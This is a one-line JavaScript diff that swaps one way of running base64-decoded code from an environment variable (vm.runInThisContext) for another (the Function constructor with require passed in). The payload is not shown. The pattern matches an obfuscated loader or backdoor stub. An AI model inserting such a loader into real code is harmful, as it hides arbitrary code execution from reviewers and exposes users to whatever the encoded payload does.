@@ -1,1 +1,1 @@
-global.require=require;require('vm').runInThisContext(atob(process.env.S))
+Function("r",atob(process.env.S2))(require)
